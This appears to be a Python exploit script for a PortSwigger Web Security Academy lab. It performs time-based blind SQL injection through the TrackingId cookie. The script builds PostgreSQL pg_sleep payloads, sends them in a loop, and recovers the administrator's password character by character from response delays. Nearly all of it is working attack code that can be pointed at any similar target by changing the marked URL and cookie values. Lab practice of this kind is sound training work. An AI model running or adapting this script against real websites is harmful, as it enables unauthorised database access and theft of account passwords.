import requests
import string
import urllib.parse as encode
from bs4 import BeautifulSoup

characters, digits, special = list(string.ascii_letters), list(string.digits), list("!\"#$&()*+,-./:;<=>?@[\]^_`{|}~")

# URL encode all special characters
special[:] = [encode.quote(x) for x in special]

# I took special characters from here: https://owasp.org/www-community/password-special-characters
# And I removed the '%' and the " ' " characters as they caused errors on the lab and the queries
characters.extend(digits)
characters.extend(special)

# Join the possible characters for the password
print("Using the following characters: \n",characters)

# Create a variable to accumulate the found characters
password = ""
base_url = "https://0a99004c04603403c08c5792002700a5.web-security-academy.net/" # CHANGE THIS

# Delay in seconds
delay = 3

# Substring index
# End variable ends the execution when no character is correct meaning 
# The password is complete
index, end = 1, 0
cont = True

def get_character_time_delay(delay,index, password, letter, base_url):
    payload = f"'+%3b+SELECT+CASE+WHEN+((SELECT+COUNT(username)+FROM+users+WHERE+username+%3d+'administrator'+AND+SUBSTRING(password,1,{index})='{password + letter}')%3d1)+THEN+pg_sleep({delay})+ELSE+pg_sleep(0)+END--"
    cookie = f"TrackingId=p9chRakknEgMEqIZ{payload}; session=mGp7DYntEHDnr3ICVemI3yYZxvRBcAeA" # CHANGE THIS
    headers = { 
        "Host" : "0a99004c04603403c08c5792002700a5.web-security-academy.net", # CHANGE THIS
        "Cookie" : cookie
    }
    # Construct the request and send it
    response = requests.get(base_url, headers=headers)
    # Check the response time as an indication of the correct character
    # in the given index
    if response.elapsed.total_seconds() >= delay:
        return letter
    return

def exploit_blind_time_delay(cont, index, end, password):
    while cont:
        # Iterate the list of possible characters
        print("Testing on index: ", index)
        # If the end is equal to the index
        # That means any of the characters was correct
        end += 1
        for letter in characters:
            #print(letter, index) # This print is useful when debugging
            
            # Try to get a character
            result = get_character_time_delay(delay,index, password, letter, base_url)
            if (result == "Error"):
                end = index
                print("ERROR: Check that the lab is working or the headers (cookie, session) values are correct")
                break
            if (result):
                # Append the found character
                password += result
                # Augment the substring index
                index += 1
                # Print the progress
                print("FOUND", password)
                # Start again on the next index
                break
        # End condition
        if (index == end):
            cont = False
    return password

print(exploit_blind_time_delay(cont, index, end, password))
